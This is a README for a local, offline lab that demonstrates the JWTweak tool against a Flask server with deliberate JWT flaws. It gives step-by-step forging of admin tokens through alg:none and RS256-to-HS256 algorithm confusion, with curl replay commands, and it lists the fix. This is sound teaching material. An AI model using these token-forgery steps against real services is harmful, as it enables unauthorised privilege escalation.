# JWTweak PoC lab

A tiny, self-contained lab to demonstrate JWTweak against a deliberately
vulnerable JWT verifier. Everything runs locally and offline.

> For education and authorised testing only.

## Files
- `vulnerable_server.py` - a Flask app with two intentional JWT bugs.
- `README_POC.md` - this guide.

The server **generates its own throwaway key pair on first run**
(`private_key.pem` / `public_key.pem`). These are not shipped in the repo - see
the security note below.

## Setup
```bash
pip install flask pyjwt cryptography rich
python3 vulnerable_server.py        # http://127.0.0.1:5000 (creates keys on first run)
```

Grab a fresh user token any time with:
```bash
curl -s -X POST http://127.0.0.1:5000/login
```
Save it to a file if you want to load it into JWTweak directly:
```bash
curl -s -X POST http://127.0.0.1:5000/login | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])" > user_token.txt
```


## Browser PoC (recommended for screenshots)

The demo now ships a polished web console, so your PoC looks like a real app
being exploited:

1. Open **http://127.0.0.1:5000** and click **Sign in** (demo credentials are
   prefilled). You land on a dashboard showing your session token and
   **role: user**.
2. Click **Open Admin Console** &mdash; you get a styled **403 Access denied**.
3. Forge an admin token with JWTweak (see the attacks below), copy it, paste it
   into the **Session token** box on the dashboard, and click **Open Admin
   Console** again &mdash; you now see the **Admin Console** with the flag.

Everything below (curl) still works too, and is handy for automation.

## Baseline (should fail)
```bash
TOKEN=$(cat user_token.txt)
curl -s http://127.0.0.1:5000/admin -H "Authorization: Bearer $TOKEN"
# -> {"error":"forbidden: admin role required","your_role":"user"}
```

## PoC A - alg:none privilege escalation
```bash
python3 JWTweak.py user_token.txt
```
In the menu:
1. `a`  (Claim tampering)
2. `c`  (make admin)
3. `s`  (finish editing)
4. `y`  (apply changes to the working token)
5. `n`  (emit an alg:none copy)

Copy the printed token and replay it:
```bash
curl -s http://127.0.0.1:5000/admin -H "Authorization: Bearer <PASTE_TOKEN>"
# -> {"message":"Welcome, admin!","flag":"JWTweak{alg_confusion_and_none_win}", ...}
```

## PoC B - algorithm confusion (RS256 -> HS256)
The server verifies with one public key but also accepts HS* and (mis)uses that
public key as the HMAC secret. Fetch the key, then forge:

```bash
curl -s http://127.0.0.1:5000/public_key.pem -o public_key.pem
python3 JWTweak.py user_token.txt
```
In the menu:
1. `a` -> `c` -> `s` -> `y` -> `skip`   (escalate to admin, no signed copy yet)
2. `3`  (Algorithm confusion)
3. paste `public_key.pem` when asked for the target public key

Replay the printed HS256 token against `/admin` - it is accepted.

## What the server does wrong (do NOT copy this)
- Trusts the `alg` header and skips verification when `alg` is `none`.
- Uses the same public key as an HMAC secret when the header says `HS*`,
  enabling algorithm confusion.

## The fix
- Pin the expected algorithm(s) server-side; never derive `alg` from the token.
- Verify asymmetric tokens only with the public key and symmetric only with a
  separate secret - never cross them.
- Reject `none`.


---

## Security note / disclaimer on keys (read this)

- The key pair this lab uses is **generated locally on first run** and protects
  nothing real. It exists only so the demo is self-contained on `127.0.0.1`.
- **Never commit private keys to a repository** - not even throwaway demo keys.
  Committing a `private_key.pem` normalises a dangerous habit, and public secret
  scanners (GitHub push protection, gitleaks, trufflehog) will flag it. This lab
  ships a `.gitignore` that excludes `poc/private_key.pem`,
  `poc/public_key.pem`, and `poc/user_token.txt` for exactly this reason.
- If you clone this lab, keep those entries in `.gitignore`. If you ever see a
  private key inside a repo, treat it as a finding.
- The verification logic in `vulnerable_server.py` is intentionally broken to
  teach the attack. **Do not copy it into anything real.** The correct defences
  are listed in the "The fix" section above.

*For education and authorised testing only. Test only systems you own or are
explicitly authorised to assess.*
